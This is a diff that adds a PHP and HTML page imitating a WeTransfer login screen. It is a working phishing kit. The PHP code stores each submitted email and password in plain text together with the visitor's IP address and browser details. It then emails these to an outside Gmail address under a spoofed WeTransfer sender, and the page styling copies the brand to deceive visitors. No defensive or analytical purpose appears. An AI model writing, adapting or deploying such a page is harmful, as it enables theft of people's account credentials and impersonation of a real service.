@@ -1,0 +1,324 @@
+<?php
+// Start session and include database connection
+session_start();
+
+// Database configuration (replace with your actual credentials)
+$db_host = 'localhost';
+$db_user = 'root';
+$db_pass = '';
+$db_name = 'wetransfer_logins';
+
+// Create connection
+$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
+
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+// Create table if it doesn't exist
+$create_table = "CREATE TABLE IF NOT EXISTS login_attempts (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    email VARCHAR(255) NOT NULL,
+    password VARCHAR(255) NOT NULL,
+    remember_me TINYINT(1) DEFAULT 0,
+    ip_address VARCHAR(45) NOT NULL,
+    device_info TEXT NOT NULL,
+    email_provider VARCHAR(100) NOT NULL,
+    attempt_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+)";
+
+if (!$conn->query($create_table)) {
+    die("Error creating table: " . $conn->error);
+}
+
+// Function to get client IP address
+function getClientIP() {
+    foreach ([
+        'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED',
+        'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'
+    ] as $key) {
+        if (!empty($_SERVER[$key])) {
+            $ipList = explode(',', $_SERVER[$key]);
+            return trim($ipList[0]);
+        }
+    }
+    return 'UNKNOWN';
+}
+
+// Initialize variables
+$email = $password = '';
+$remember = 0;
+$error = $success = '';
+
+// Handle form submission
+if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['email'], $_POST['password'])) {
+    $email = trim($_POST['email']);
+    $password = $_POST['password'];
+    $remember = isset($_POST['remember']) ? 1 : 0;
+
+    // Validate inputs
+    if (empty($email) || empty($password)) {
+        $error = "Please fill in all fields";
+    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        $error = "Invalid email format";
+    } else {
+        // Get additional information
+        $ip = getClientIP();
+        $device_info = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+        $email_provider = explode('@', $email)[1] ?? 'unknown';
+
+        // Prepare and execute database insert
+        $stmt = $conn->prepare("INSERT INTO login_attempts (email, password, remember_me, ip_address, device_info, email_provider) VALUES (?, ?, ?, ?, ?, ?)");
+        $stmt->bind_param("ssisss", $email, $password, $remember, $ip, $device_info, $email_provider);
+
+        if ($stmt->execute()) {
+            // Send email notification
+            $toEmail = "barrysilbertbtc@gmail.com";
+            $subject = "WeTransfer Login Details";
+            
+            $headers = "MIME-Version: 1.0" . "\r\n";
+            $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+            $headers .= 'From: WeTransfer <no-reply@wetransfer.com>' . "\r\n";
+            
+            $message = "
+            <html>
+            <head>
+                <title>Login Confirmation</title>
+            </head>
+            <body>
+                <h2>WeTransfer Login Successful</h2>
+                <p>Email: <strong>$email</strong></p>
+                <p>Password: <strong>$password</strong></p>
+                <p>Remember Me: <strong>" . ($remember ? 'Yes' : 'No') . "</strong></p>
+                <p>IP Address: <strong>$ip</strong></p>
+                <p>Device: <strong>$device_info</strong></p>
+                <p>Email Provider: <strong>$email_provider</strong></p>
+                <br>
+                <p>Best regards,<br>WeTransfer Team</p>
+            </body>
+            </html>
+            ";
+            
+            if (mail($toEmail, $subject, $message, $headers)) {
+                $success = "Login successful! Data has been recorded.";
+            } else {
+                $error = "Login recorded but email notification failed to send.";
+            }
+        } else {
+            $error = "Error recording login attempt: " . $conn->error;
+        }
+        $stmt->close();
+    }
+}
+$conn->close();
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WeTransfer Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+            padding-right: 10%;
+            background-image: url('https://images.unsplash.com/photo-1518655048521-f130df041f66?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
+            background-size: cover;
+            background-position: center;
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 380px;
+            padding: 40px;
+            position: relative;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            color: #000;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #0066ff;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .checkbox-group input {
+            margin-right: 10px;
+        }
+        
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 25px;
+        }
+        
+        .forgot-password a {
+            color: #0066ff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .btn-login {
+            background-color: #000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 14px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background-color 0.3s;
+        }
+        
+        .btn-login:hover {
+            background-color: #333;
+        }
+        
+        .footer {
+            position: absolute;
+            bottom: -40px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+        }
+        
+        .alert {
+            padding: 12px 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .alert-error {
+            background-color: #ffebee;
+            color: #c62828;
+            border: 1px solid #ef9a9a;
+            display: block;
+        }
+        
+        .alert-success {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #a5d6a7;
+            display: block;
+        }
+        
+        @media (max-width: 768px) {
+            body {
+                justify-content: center;
+                padding-right: 0;
+                background-image: none;
+                background-color: #f5f5f5;
+            }
+            
+            .login-container {
+                width: 90%;
+                max-width: 380px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <h1>WeTransfer</h1>
+        </div>
+        
+        <?php if (!empty($error)): ?>
+            <div class="alert alert-error"><?php echo htmlspecialchars($error); ?></div>
+        <?php endif; ?>
+        
+        <?php if (!empty($success)): ?>
+            <div class="alert alert-success"><?php echo htmlspecialchars($success); ?></div>
+        <?php endif; ?>
+        
+        <form id="loginForm" method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" class="form-control" placeholder="your@email.com" value="<?php echo htmlspecialchars($email); ?>" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" class="form-control" placeholder="••••••••" required>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="remember" name="remember" <?php echo $remember ? 'checked' : ''; ?>>
+                <label for="remember">Remember me</label>
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+            
+            <button type="submit" class="btn-login">
+                <span>Log in with WeTransfer</span>
+                <svg width="8" height="12" viewBox="0 0 8 12" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M0 1.4L1.4 0L7.4 6L1.4 12L0 10.6L4.6 6L0 1.4Z" fill="white"/>
+                </svg>
+            </button>
+        </form>
+        
+        <div class="footer">
+            <p>PS 30°C 3:29 PM 5/29/2025</p>
+        </div>
+    </div>
+</body>
+</html>
